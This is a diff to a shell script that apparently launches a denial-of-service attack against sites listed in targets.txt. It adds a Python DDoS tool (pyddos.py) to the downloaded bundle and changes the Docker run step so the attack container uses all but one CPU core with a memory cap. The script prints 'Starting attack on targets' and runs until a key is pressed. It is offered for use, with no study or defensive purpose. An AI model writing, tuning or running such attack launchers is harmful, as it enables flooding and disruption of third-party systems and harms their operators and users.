@@ -23,6 +23,7 @@ if [[ $1 = '-u' || ! -f 'Dockerfile' ]]; then
     unzip -o "$ACTUAL_TAG.zip"
     mv "$REPO_NAME-$ACTUAL_TAG/Dockerfile" .
     mv "$REPO_NAME-$ACTUAL_TAG/attack.sh" .
+    mv "$REPO_NAME-$ACTUAL_TAG/pyddos.py" .
     mv "$REPO_NAME-$ACTUAL_TAG/targets.txt" .
 
     # Cleanup
@@ -39,7 +40,8 @@ echo ""
 echo "Starting attack on targets: "
 cat targets.txt
 echo ""
-CONTAINER_ID=$(sudo docker run -d "$REPO_NAME")
+CPUS=$[$(nproc --all) - 1]; (($CPUS)) || CPUS=1  # use <total CPU cores> - 1 but not less than 1
+CONTAINER_ID=$(sudo docker run -m 100m --cpus $CPUS -d "$REPO_NAME")
 
 # Wait for input
 read -n 1 -p "Press any key to stop"
